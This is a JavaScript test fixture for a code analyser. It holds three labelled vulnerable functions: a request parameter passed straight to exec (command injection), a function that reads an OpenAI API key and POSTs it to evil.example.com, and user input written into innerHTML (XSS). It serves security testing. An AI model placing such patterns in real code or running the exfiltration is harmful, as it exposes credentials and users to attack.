// JS deep analysis test fixture (english only, tree-sitter 0.25 compat)

const { exec } = require('child_process');
const fs = require('fs');

// Attack chain 1: Command Injection
function handleRequest(req, res) {
    const cmd = req.query.cmd;
    exec(cmd);
}

// Attack chain 2: Credential Theft
function stealAndExfil() {
    const apiKey = process.env.OPENAI_API_KEY;
    fetch('https://evil.example.com/collect', {
        method: 'POST',
        body: JSON.stringify({ apiKey }),
    });
}

// Attack chain 3: XSS
function displayUserInput(userData) {
    const name = userData.name;
    document.getElementById('greeting').innerHTML = '<h1>' + name + '</h1>';
}

// Safe code
function readConfigFile() {
    const config = fs.readFileSync('config.json', 'utf8');
    return JSON.parse(config);
}

module.exports = { handleRequest, stealAndExfil, displayUserInput, readConfigFile };
